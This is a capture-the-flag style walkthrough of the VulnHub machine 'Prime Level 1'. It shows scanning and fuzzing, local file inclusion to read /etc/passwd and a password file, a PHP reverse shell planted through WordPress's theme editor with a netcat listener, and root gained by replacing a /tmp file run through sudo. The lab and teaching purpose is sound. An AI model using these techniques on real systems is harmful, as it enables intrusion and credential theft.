**Vulnerable System**: Prime Level 1
====================================

**Operating System**: Ubuntu 16.04

**Kernel**: 4.10.0

**Vulnerability Exploited**: Local File Inclusion

**Exploit Used**: N/A

**Proof of Concept Code**: 

```curl http://192.168.20.149/image.php?secrettier360=/etc/passwd```

```curl http://192.168.20.149/image.php?secrettier360=/home/saket/password.txt```

**Vulnerability Explained**: Local file inclusion present in parameter secrettier360 allowed to obtain /etc/passwd and password.txt file. 
/etc/passwd shows the users present on the system and password.txt file contained WordPress credentials.

**Vulnerability fix**: Avoid passing user submitted input to anyt filesystem/framework API. 
Maintain whitelist of files that may be accessed by the web page/application and use identifier instead of filename to access the requested file.

**Severity**: **Medium**

---------------------------------------------------------------------------------------------------------------------------------------
**Vulnerability Exploited**: Weak File Permissions (Writable PHP script)

**Exploit Used**: N/A

**Proof of Concept Code**: [pentestmonkey's php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

**Vulnerability Explained**: WordPress' theme editor contained a writeable PHP file, which was used to insert php reverse shell into.

**Vulnerability fix**: Employ strong file permissions as per principal of the least privilege. Write access should be prohibitted when it comes to PHP scripts

**Severity**: **Medium**
---------------------------------------------------------------------------------------------------------------------------------------
**Privilege Escalation Vulnerability**: 

**Exploit Used**:

**Proof of Concept Code**:

**Privilege Escalation Vulnerability Explained:**

**Vulnerability fix**:

**Severity**: **High**

Methodology
-----------

Netdiscover
-----------

root\@kali:\~\# netdiscover -r 192.168.20.0/24

3 Captured ARP Req/Rep packets, from 3 hosts. Total size: 180

\____________________________________________________________________________\_

IP At MAC Address Count Len MAC Vendor / Hostname

\-----------------------------------------------------------------------------

192.168.20.1 00:50:56:c0:00:01 1 60 VMware, Inc.

192.168.20.149 00:0c:29:2c:25:11 1 60 VMware, Inc.

192.168.20.254 00:50:56:e2:32:bb 1 60 VMware, Inc.

Nmap
----

Nmap all ports scan:

root\@kali:\~\# nmap -p- 192.168.20.149

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-09 10:40 EDT

Nmap scan report for 192.168.20.149

Host is up (0.00014s latency).

Not shown: 65533 closed ports

PORT STATE SERVICE

22/tcp open ssh

80/tcp open http

MAC Address: 00:0C:29:2C:25:11 (VMware)

Nmap version and default script scan:

root\@kali:\~\# nmap -sV -sC -A -p22,80 192.168.20.149

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-09 10:41 EDT

Nmap scan report for 192.168.20.149

Host is up (0.00068s latency).

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

\| ssh-hostkey:

\| 2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)

\| 256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)

\|\_ 256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)

80/tcp open http Apache httpd 2.4.18 ((Ubuntu))

\|_http-server-header: Apache/2.4.18 (Ubuntu)

\|_http-title: HacknPentest

MAC Address: 00:0C:29:2C:25:11 (VMware)

Warning: OSScan results may be unreliable because we could not find at least 1
open and 1 closed port

Device type: general purpose

Running: Linux 3.X\|4.X

OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4

OS details: Linux 3.2 - 4.9

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE

HOP RTT ADDRESS

1 0.68 ms 192.168.20.149

Web Port Enumeration (Port 80)
------------------------------

### Nikto

root\@kali:\~\# nikto -h 192.168.20.149

\- Nikto v2.1.6

\---------------------------------------------------------------------------

\+ Target IP: 192.168.20.149

\+ Target Hostname: 192.168.20.149

\+ Target Port: 80

\+ Start Time: 2019-09-09 10:42:44 (GMT-4)

\---------------------------------------------------------------------------

\+ Server: Apache/2.4.18 (Ubuntu)

\+ The anti-clickjacking X-Frame-Options header is not present.

\+ The X-XSS-Protection header is not defined. This header can hint to the user
agent to protect against some forms of XSS

\+ The X-Content-Type-Options header is not set. This could allow the user agent
to render the content of the site in a different fashion to the MIME type

\+ No CGI Directories found (use '-C all' to force check all possible dirs)

\+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37).
Apache 2.2.34 is the EOL for the 2.x branch.

\+ Web Server returns a valid response with junk HTTP methods, this may cause
false positives.

\+ OSVDB-3233: /icons/README: Apache default file found.

\+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host

\+ End Time: 2019-09-09 10:43:43 (GMT-4) (59 seconds)

\---------------------------------------------------------------------------

\+ 1 host(s) tested

### GoBuster

Scanning the webserver for hidden directories.

root\@kali:\~\# gobuster dir -u 192.168.20.149 -w
/usr/share/wordlists/dirb/common.txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (\@TheColonial) & Christian Mehlmauer (\@_FireFart_)

===============================================================

[+] Url: http://192.168.20.149

[+] Threads: 10

[+] Wordlist: /usr/share/wordlists/dirb/common.txt

[+] Status codes: 200,204,301,302,307,401,403

[+] User Agent: gobuster/3.0.1

[+] Timeout: 10s

===============================================================

2019/09/09 10:47:25 Starting gobuster

===============================================================

/.htpasswd (Status: 403)

/.hta (Status: 403)

/.htaccess (Status: 403)

/dev (Status: 200)

/index.php (Status: 200)

/javascript (Status: 301)

/server-status (Status: 403)

/wordpress (Status: 301)

===============================================================

2019/09/09 10:47:29 Finished

===============================================================

Scanning webserver for hidden directories and files with extension .txt

root\@kali:\~/vulnhub/prime_level1\# gobuster dir -u 192.168.20.149 -w
/usr/share/wordlists/dirb/common.txt -x .txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (\@TheColonial) & Christian Mehlmauer (\@_FireFart_)

===============================================================

[+] Url: http://192.168.20.149

[+] Threads: 10

[+] Wordlist: /usr/share/wordlists/dirb/common.txt

[+] Status codes: 200,204,301,302,307,401,403

[+] User Agent: gobuster/3.0.1

[+] Extensions: txt

[+] Timeout: 10s

===============================================================

2019/09/09 16:55:18 Starting gobuster

===============================================================

/.htaccess (Status: 403)

/.htaccess.txt (Status: 403)

/.htpasswd (Status: 403)

/.htpasswd.txt (Status: 403)

/.hta (Status: 403)

/.hta.txt (Status: 403)

/dev (Status: 200)

/index.php (Status: 200)

/javascript (Status: 301)

/secret.txt (Status: 200)

/server-status (Status: 403)

/wordpress (Status: 301)

===============================================================

2019/09/09 16:55:19 Finished

===============================================================

### Browser

/dev directory

![](media/5acaa47bb5fc62fb23b206a1404c8707.png)

/wordpress directory

![](media/9bc6c76b73cf4ada5c444b454f7933ab.png)

/secret.txt file.

![](media/a3e30701855a010f70a95acc0731bb14.png)

As can be seen from the hint above there is a file location.txt on a php page.
From gobuster output, the homepage is index.php.

Browsing to the github repository, it’s indicated that the idea is to use wfuzz
tool.

![](media/c5098089b44f2632e0c08dd71f770612.png)

### wfuzz

Fuzzing index.php with wfuzz.

root\@kali:\~\# wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc
404 http://192.168.20.149/index.php?FUZZ

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\* Wfuzz 2.4 - The Web Fuzzer \*

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

Target: http://192.168.20.149/index.php?FUZZ

Total requests: 949

===================================================================

ID Response Lines Word Chars Payload

===================================================================

000000005: 200 7 L 12 W 136 Ch "03"

000000001: 200 7 L 12 W 136 Ch "\@"

000000002: 200 7 L 12 W 136 Ch "00"

000000003: 200 7 L 12 W 136 Ch "01"

000000004: 200 7 L 12 W 136 Ch "02"

000000011: 200 7 L 12 W 136 Ch "2"

000000012: 200 7 L 12 W 136 Ch "20"

000000013: 200 7 L 12 W 136 Ch "200"

000000014: 200 7 L 12 W 136 Ch "2000"

000000015: 200 7 L 12 W 136 Ch "2001"

000000016: 200 7 L 12 W 136 Ch "2002"

000000017: 200 7 L 12 W 136 Ch "2003"

000000018: 200 7 L 12 W 136 Ch "2004"

000000019: 200 7 L 12 W 136 Ch "2005"

000000020: 200 7 L 12 W 136 Ch "3"

000000022: 200 7 L 12 W 136 Ch "aa"

000000023: 200 7 L 12 W 136 Ch "aaa"

000000024: 200 7 L 12 W 136 Ch "abc"

It looks like 12 W is the common length for the total word count. Once the
filter is put for the length, there’s only one entry left.

root\@kali:\~\# wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc
404 --hw 12 http://192.168.20.149/index.php?FUZZ

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\* Wfuzz 2.4 - The Web Fuzzer \*

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

Target: http://192.168.20.149/index.php?FUZZ

Total requests: 949

===================================================================

ID Response Lines Word Chars Payload

===================================================================

000000340: 200 7 L 19 W 206 Ch "file"

Total time: 1.860162

Processed Requests: 949

Filtered Requests: 948

Requests/sec.: 510.1706

### Browser (Further enumeration)

Now that the fuzzing parameter file is known, browser can be used to enumerate
it.

![](media/dd045d6ba181592108dd9e4b1e574bf3.png)

Here is another hint, secrettier360 parameter should be used on another php
page.

### Gobuster (Enumeration for Additional PHP Pages)

root\@kali:\~\# gobuster dir -u http://192.168.20.149/ -w
/usr/share/wordlists/dirb/common.txt -x .php

===============================================================

Gobuster v3.0.1

by OJ Reeves (\@TheColonial) & Christian Mehlmauer (\@_FireFart_)

===============================================================

[+] Url: http://192.168.20.149/

[+] Threads: 10

[+] Wordlist: /usr/share/wordlists/dirb/common.txt

[+] Status codes: 200,204,301,302,307,401,403

[+] User Agent: gobuster/3.0.1

[+] Extensions: php

[+] Timeout: 10s

===============================================================

2019/09/09 18:16:51 Starting gobuster

===============================================================

/.htpasswd (Status: 403)

/.htpasswd.php (Status: 403)

/.htaccess (Status: 403)

/.htaccess.php (Status: 403)

/.hta (Status: 403)

/.hta.php (Status: 403)

/dev (Status: 200)

/image.php (Status: 200)

/index.php (Status: 200)

/index.php (Status: 200)

/javascript (Status: 301)

/server-status (Status: 403)

/wordpress (Status: 301)

===============================================================

2019/09/09 18:16:53 Finished

From the output above, another php page brings attention: Image.php

### Wfuzz (Further enumeration)

root\@kali:\~\# wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc
404 http://192.168.20.149/image.php?secrettier360=FUZZ

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\* Wfuzz 2.4 - The Web Fuzzer \*

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

Target: http://192.168.20.149/image.php?secrettier360=FUZZ

Total requests: 949

===================================================================

ID Response Lines Word Chars Payload

===================================================================

000000001: 200 6 L 17 W 197 Ch "\@"

000000002: 200 6 L 17 W 197 Ch "00"

000000003: 200 6 L 17 W 197 Ch "01"

000000004: 200 6 L 17 W 197 Ch "02"

000000005: 200 6 L 17 W 197 Ch "03"

000000006: 200 6 L 17 W 197 Ch "1"

000000007: 200 6 L 17 W 197 Ch "10"

000000008: 200 6 L 17 W 197 Ch "100"

000000009: 200 6 L 17 W 197 Ch "1000"

000000010: 200 6 L 17 W 197 Ch "123"

000000011: 200 6 L 17 W 197 Ch "2"

000000012: 200 6 L 17 W 197 Ch "20"

000000013: 200 6 L 17 W 197 Ch "200"

root\@kali:\~\# wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc
404 --hw 17 http://192.168.20.149/image.php?secrettier360=FUZZ

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\* Wfuzz 2.4 - The Web Fuzzer \*

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

Target: http://192.168.20.149/image.php?secrettier360=FUZZ

Total requests: 949

===================================================================

ID Response Lines Word Chars Payload

===================================================================

000000256: 200 13 L 43 W 328 Ch "dev"

Total time: 1.843070

Processed Requests: 949

Filtered Requests: 948

Requests/sec.: 514.9015

### Browser (The Right Parameter)

![](media/d98830f11a4d6c5dc4c114621eaf46bf.png)

### Curl

Next curl can be used to test for Local File Inclusion.

root\@kali:\~\# curl http://192.168.20.149/image.php?secrettier360=/etc/passwd

\<html\>

\<title\>HacknPentest\</title\>

\<body\>

\<img src='hacknpentest.png' alt='hnp security' width="1300" height="595"
/\>\</p\>\</p\>\</p\>

\</body\>

finaly you got the right
parameter\<br\>\<br\>\<br\>\<br\>root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-timesync:x:100:102:systemd Time
Synchronization,,,:/run/systemd:/bin/false

systemd-network:x:101:103:systemd Network
Management,,,:/run/systemd/netif:/bin/false

systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false

systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false

syslog:x:104:108::/home/syslog:/bin/false

\_apt:x:105:65534::/nonexistent:/bin/false

messagebus:x:106:110::/var/run/dbus:/bin/false

uuidd:x:107:111::/run/uuidd:/bin/false

lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false

whoopsie:x:109:117::/nonexistent:/bin/false

avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false

avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false

dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false

colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false

speech-dispatcher:x:114:29:Speech
Dispatcher,,,:/var/run/speech-dispatcher:/bin/false

hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false

kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false

pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false

rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false

saned:x:119:127::/var/lib/saned:/bin/false

usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false

victor:x:1000:1000:victor,,,:/home/victor:/bin/bash

mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false

**saket:x:1001:1001:find password.txt file in my directory:/home/saket:**

sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin

As can be seen from the output above, looks like user saket has password.txt
file in his home directory.

root\@kali:\~\# curl
http://192.168.20.149/image.php?secrettier360=/home/saket/password.txt

\<html\>

\<title\>HacknPentest\</title\>

\<body\>

\<img src='hacknpentest.png' alt='hnp security' width="1300" height="595"
/\>\</p\>\</p\>\</p\>

\</body\>

finaly you got the right parameter\<br\>\<br\>\<br\>\<br\>**follow_the_ippsec**

\</html\>

Follow_the_ippsec is the contents of password.txt file.

### Browser (WordPress Admin’s Panel)

The password did not work for user victor and saket when tried with SSH.
However, it did work for the WordPress site’s administrator’s panel.

![](media/37f1f9cd00fe0148b05b1347ddd2bfdf.png)

Low Privilege Exploitation
--------------------------

After further enumeration a writeable php file has been found, while using
WordPress’ theme editor.

![](media/cbd8b5603277fbdb8e0888e50a36aea0.png)

A PHP reverse shell code can be found on Kali,
/usr/share/webshells/php/php-reverse-shell.php

Using gedit to open the file and copy the shell code.

root\@kali:\~\# gedit /usr/share/webshells/php/php-reverse-shell.php

![](media/2eada3c53aa8068a86df88141b093b99.png)

PHP reverse shell code can be inserted into this php file.

Notice that IP address variable must be changed to the IP of the attacking
system and port variable must be changed to the port that is listening on the
attacking system.

![](media/a84101f566957f1040ce8641a31ad330.png)

Once the changes are made the file can be saved.

The file has be browsed to execute the reverse shell. (Theme files usually
reside in /wp-content/themes directory). The theme’s name is twentynineteen so
the URL syntax would be as following:

http://\<ip address\>/wordpress/wp-content/themes/twentynineteen/secret.php

Next, on the Kali machine netcat needs to be fired up to listen on the desired
port and when the file is browsed the reverse shell is obtained.

root\@kali:\~\# nc -nvlp 443

listening on [any] 443 ...

connect to [192.168.20.144] from (UNKNOWN) [192.168.20.149] 57386

Linux ubuntu 4.10.0-28-generic \#32\~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC
2017 x86_64 x86_64 x86_64 GNU/Linux

16:02:36 up 1:13, 0 users, load average: 0.00, 0.00, 0.02

USER TTY FROM LOGIN\@ IDLE JCPU PCPU WHAT

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off

Privilege Escalation
--------------------

Once the low privilege shell is obtained it needs to be upgraded to a TTY shell,
so commands such as su can be used. This is achieved with the following python
command:

\$ python -c "import pty;pty.spawn('/bin/bash')"

www-data\@ubuntu:/\$

### Enumeration

From previous enumeration it’s known that home directory of user saket is
available. Let’s enumerate it further.

www-data\@ubuntu:/var/www\$ cd /home/saket

cd /home/saket

www-data\@ubuntu:/home/saket\$ ls -laht

ls -laht

total 36K

drwxr-xr-x 2 root root 4.0K Aug 31 03:15 .

\-rw-r--r-- 1 root root 33 Aug 31 03:14 user.txt

\-rw------- 1 root root 20 Aug 31 03:08 .bash_history

\-rwxr-x--x 1 root root 14K Aug 30 08:48 enc

\-rw-r--r-- 1 root root 18 Aug 29 13:59 password.txt

drwxr-xr-x 4 root root 4.0K Aug 29 13:58 ..

www-data\@ubuntu:/home/saket\$ cat user.txt

cat user.txt

af3c658dcf9d7190da3153519c003456

Looks like there is a user.txt flag and a file called enc, which seems to be
executable by anyone.

Further enumeration shows that www-data user can execute enc file with root
privileges.

www-data\@ubuntu:/home/saket\$ sudo -l

sudo -l

Matching Defaults entries for www-data on ubuntu:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User www-data may run the following commands on ubuntu:

(root) NOPASSWD: /home/saket/enc

www-data\@ubuntu:/home/saket\$

When trying to execute enc the following message is presented:

www-data\@ubuntu:/home/saket\$ sudo /home/saket/enc

sudo /home/saket/enc

enter password: password

password

www-data\@ubuntu:/home/saket\$

Enumerating further a backup_pass file is found in /opt/backup/server_database
with credentials for “enc” executable.

www-data\@ubuntu:/home/saket\$ ls -laht /opt

ls -laht /opt

total 12K

drwxr-xr-x 3 root root 4.0K Aug 30 09:07 backup

drwxr-xr-x 3 root root 4.0K Aug 30 09:07 .

drwxr-xr-x 24 root root 4.0K Aug 29 10:57 ..

www-data\@ubuntu:/home/saket\$ cd /opt/backup

cd /opt/backup

www-data\@ubuntu:/opt/backup\$ ls -laht

ls -laht

total 12K

drwxr-xr-x 2 root root 4.0K Aug 30 09:08 server_database

drwxr-xr-x 3 root root 4.0K Aug 30 09:07 .

drwxr-xr-x 3 root root 4.0K Aug 30 09:07 ..

www-data\@ubuntu:/opt/backup\$ cd server_database

cd server_database

cat pwww-data\@ubuntu:/opt/backup/server_database\$ ls -laht

ls -laht

total 12K

drwxr-xr-x 2 root root 4.0K Aug 30 09:08 .

\-rw-r--r-- 1 root root 75 Aug 30 09:08 backup_pass

\-rw-r--r-- 1 root root 0 Aug 30 09:07 {hello.8}

drwxr-xr-x 3 root root 4.0K Aug 30 09:07 ..

www-data\@ubuntu:/opt/backup/server_database\$ cat \*

cat \*

your password for backup_database file enc is

"backup_password"

Enjoy!

Once the right password is provided, the enc file creates 2 files: key.txt and
enc.txt.

www-data\@ubuntu:/home/saket\$ sudo /home/saket/enc

sudo /home/saket/enc

enter password: backup_password

backup_password

good

www-data\@ubuntu:/home/saket\$ ls -laht

ls -laht

total 44K

\-rw-r--r-- 1 root root 123 Sep 14 10:03 key.txt

drwxr-xr-x 2 root root 4.0K Sep 14 10:03 .

\-rw-r--r-- 1 root root 237 Sep 14 10:03 enc.txt

\-rw-r--r-- 1 root root 33 Aug 31 03:14 user.txt

\-rw------- 1 root root 20 Aug 31 03:08 .bash_history

\-rwxr-x--x 1 root root 14K Aug 30 08:48 enc

\-rw-r--r-- 1 root root 18 Aug 29 13:59 password.txt

drwxr-xr-x 4 root root 4.0K Aug 29 13:58 ..

Enumerating these files further.

www-data\@ubuntu:/home/saket\$ cat key.txt enc.txt

cat key.txt enc.txt

I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your
real form.

nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=

### www-data to saket user

The key.txt file urges to hash “ippsec” string into md5 format.

root\@kali:\~\# echo -n ippsec \| md5sum

366a74cb3c959de17d61db30591c39d1 -

The enc.txt file output looks like a base64 string, which Kali can be used to
decode. However, when trying to simply decode it, the result turns out
fruitless. This is due to base64 string being encrypted with AES encryption.

There is an online tool which can help with decryption at
<https://www.devglan.com/online-tools/aes-encryption-decryption>. However, this
can also be done manually as show below.

As per [OpenSSL](<https://wiki.openssl.org/index.php/Enc>) documentation the
“The key and the IV are given in hex.” There is no IV in this case, however the
key has to be converted to hex.

root\@kali:\~/vulnhub/prime_level1\# echo -n 366a74cb3c959de17d61db30591c39d1 \|
od -A n -t x1

33 36 36 61 37 34 63 62 33 63 39 35 39 64 65 31

37 64 36 31 64 62 33 30 35 39 31 63 33 39 64 31

After playing around with different encryption ciphers the suitable one has been
found AES 256 ECB.

Below are the commands needed to decrypt the base64 string.

root\@kali:\~/vulnhub/prime_level1\# echo
"nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4="
\| openssl enc -aes-256-ecb -d -a -K
3336366137346362336339353964653137643631646233303539316333396431 \| base64 \|
base64 -d

Dont worry saket one day we will reach to

our destination very soon. And if you forget

your username then use your old password

==\> "tribute_to_ippsec"

Victor,

From above message it looks like the password for user saket is obtained. Now
it’s time to switch from www-data to saket.

www-data\@ubuntu:/home/saket\$ su saket

su saket

Password: tribute_to_ippsec

saket\@ubuntu:\~\$

Enumerating saket’s sudo privileges.

saket\@ubuntu:\~\$ sudo -l

sudo -l

Matching Defaults entries for saket on ubuntu:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User saket may run the following commands on ubuntu:

(root) NOPASSWD: /home/victor/undefeated_victor

saket\@ubuntu:\~\$

### Exploitation

Running the command.

saket\@ubuntu:\~\$ sudo /home/victor/undefeated_victor

sudo /home/victor/undefeated_victor

if you can defeat me then challenge me in front of you

/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor:
/tmp/challenge: not found

Seems like the SUID executable is requesting a file called challenge in /tmp/
folder.

Switching to tmp folder and copying /bin/bash as “challenge”.

saket\@ubuntu:\~\$ cd /tmp

cd /tmp

saket\@ubuntu:/tmp\$ cp /bin/bash /tmp/challenge

cp /bin/bash /tmp/challenge

After executing undefeated_victor again the root is obtained.

saket\@ubuntu:/tmp\$ sudo /home/victor/undefeated_victor

sudo /home/victor/undefeated_victor

if you can defeat me then challenge me in front of you

root\@ubuntu:/tmp\# whoami

whoami

root

root\@ubuntu:/tmp\# cd /root

cd /root

root\@ubuntu:/root\# ls -laht

ls -laht

total 92K

\-rw------- 1 root root 8.4K Sep 1 05:01 .bash_history

drwx------ 5 root root 4.0K Aug 31 09:08 .

\-rwxr-xr-x 1 root root 442 Aug 31 09:08 t.sh

\-rw-r--r-- 1 root root 66 Aug 31 05:42 .selected_editor

\-rw-r--r-- 1 root root 123 Aug 30 09:13 key.txt

\-rwxr-xr-x 1 root root 14K Aug 30 08:42 enc

\-rw-r--r-- 1 root root 305 Aug 30 08:42 enc.cpp

\-rw-r--r-- 1 root root 237 Aug 30 08:36 enc.txt

\-rw-r--r-- 1 root root 33 Aug 30 08:25 root.txt

\-rw------- 1 root root 137 Aug 30 05:29 .mysql_history

\-rw-r--r-- 1 root root 805 Aug 30 03:14 sql.py

drwxr-xr-x 10 root root 4.0K Aug 30 01:03 wfuzz

drwx------ 3 root root 4.0K Aug 30 01:03 .cache

drwxr-xr-x 2 root root 4.0K Aug 29 12:06 .nano

\-rw-r--r-- 1 root root 170 Aug 29 11:24 wordpress.sql

drwxr-xr-x 24 root root 4.0K Aug 29 10:57 ..

\-rw-r--r-- 1 root root 3.1K Oct 22 2015 .bashrc

\-rw-r--r-- 1 root root 148 Aug 17 2015 .profile

### Root Flag

root\@ubuntu:/root\# cat root.txt

cat root.txt

b2b17036da1de94cfb024540a8e7075a
